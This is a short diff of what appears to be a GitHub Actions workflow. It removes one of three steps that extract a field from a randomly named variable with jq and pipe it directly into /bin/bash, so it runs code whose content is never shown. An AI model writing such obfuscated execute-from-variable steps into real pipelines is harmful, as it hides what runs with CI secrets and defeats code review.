@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$qpg528" | jq -r .krp1720 | /bin/bash
           echo $iut5 | jq -r .aus13 | /bin/bash
-          echo $hq633 | jq -r .x581 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
